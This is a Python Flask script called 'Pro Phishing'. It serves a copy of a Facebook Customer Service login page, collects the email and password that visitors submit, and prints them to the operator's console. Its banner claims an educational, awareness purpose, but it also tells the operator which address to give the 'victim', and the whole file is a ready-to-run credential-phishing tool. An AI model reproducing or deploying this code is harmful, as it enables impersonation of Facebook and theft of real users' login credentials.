import pyfiglet
from colorama import Fore, Style, init
from flask import Flask, request, render_template_string

# Initialize colorama
init(autoreset=True)

# ASCII Art and Console Output
title_font = pyfiglet.Figlet(font='slant')
subtitle_font = pyfiglet.Figlet(font='small')
title = "Pro Phishing"
subtitle = "Made by JUNAYAD AHSAN"
description = "phishing awareness"

print(Fore.CYAN + title_font.renderText(title))
print(Fore.YELLOW + subtitle_font.renderText(subtitle))
print(Fore.GREEN + f"This tool is made for {Style.BRIGHT}educational purposes only.")
print(Fore.MAGENTA + f"By this tool, people can learn about {Style.BRIGHT}{description}.")
print(Fore.RED + f"Use this tool for {Style.BRIGHT}ethical purposes only.")
print(Fore.CYAN + f"Use http://192.168.0.104:5000 for victim")
print(Fore.CYAN + f"Remember: {Style.BRIGHT}Be legal be safe.")

# Flask Application
app = Flask(__name__)

# HTML Content
html_content = """
<!DOCTYPE html>
<html>
<head>
  <title>Log in to Facebook Customer Service</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      background-color: #f0f2f5;
      font-family: sans-serif;
    }

    .container {
      width: 400px;
      margin: 100px auto;
      padding: 20px;
      background-color: #fff;
      border-radius: 5px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    }

    h1 {
      text-align: center;
      margin-bottom: 20px;
      color: blue;
    }

    h2 {
      text-align: center;
      margin-bottom: 20px;
    }

    input[type="text"], input[type="password"] {
      width: 100%;
      padding: 10px;
      margin-bottom: 15px;
      border: 1px solid #ccc;
      border-radius: 3px;
      box-sizing: border-box;
    }

    input[type="submit"] {
      background-color: #4267b2;
      color: white;
      padding: 12px 20px;
      border: none;
      border-radius: 3px;
      cursor: pointer;
      width: 100%;
    }

    input[type="submit"]:hover {
      background-color: #365899;
    }

    .forgot-password {
      text-align: center;
      margin-bottom: 10px;
    }

    a {
      color: #4267b2;
      text-decoration: none;
    }

    a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <h1 class="blue-text">facebook</h1>
  <div class="container">
    <h2>Log in to Facebook Customer Service</h2>
    <form method="POST" action="/login">
      <input type="text" name="email" placeholder="Email address or phone number" required>
      <input type="password" name="password" placeholder="Password" required>
      <input type="submit" value="Log in">
    </form>
    <div class="forgot-password">
      <a href="https://www.facebook.com/login.php" target="_blank">Forgotten password?</a>
    </div>
  </div>
</body>
</html>
"""

@app.route("/", methods=["GET"])
def home():
    """Serves the phishing demonstration login page."""
    return render_template_string(html_content)

@app.route("/login", methods=["POST"])
def login():
    """Handles the fake login submission."""
    email = request.form.get("email")
    password = request.form.get("password")
    # Log the submission for educational purposes only
    print(f"{Fore.YELLOW}[INFO] Received login attempt: Email={email}, Password={password}")
    # Respond with a demonstration page
    return "<h1>Login attempt received.Thank you for use our service.</h1>"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)

